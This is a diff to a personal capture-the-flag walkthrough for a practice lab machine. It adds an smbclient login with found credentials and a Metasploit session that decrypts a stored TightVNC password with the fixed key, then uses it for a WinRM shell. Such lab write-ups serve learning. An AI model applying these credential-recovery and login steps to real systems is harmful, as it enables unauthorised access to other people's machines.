@@ -119,6 +119,9 @@ sudo mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/data .
 ```
 - after waiting a minute we got the shares
 - we can skip the moungting and just use thisafter connecting with smbclient
+- ```
+  smbclient --user r.thompson //10.10.10.182/data rY4n5eva
+  ```
 ```
 mask ""
 recurse ON
@@ -131,4 +134,21 @@ find smb-data-loot/ -type f
 ```
 - nice list of the files
 - Meeting_Notes_June_2018.html presents like an email after reading it we need to keep an eye out for the admin account password and TempAdmin.
+- file "IT/Temp/s.smith/VNC Install.reg" after reading it we found a password in hex but after cracking it no password was given so we search for tightvnc password decrypt and found a way using msfconsole
+```
+msf6 > irb
+[*] Starting IRB shell...
+[*] You are in the "framework" object
+
+irb: warn: can't alias jobs from irb_jobs.
+>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+=> "\x17Rk\x06#NX\a"
+>> require 'rex/proto/rfb'
+=> true
+>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
+=> "sT333ve2"
+>> 
+                
+```
+- we have password with user s.smith since it is his directory now we can try winrm  and we got a shell and user flag on desktop
 - 
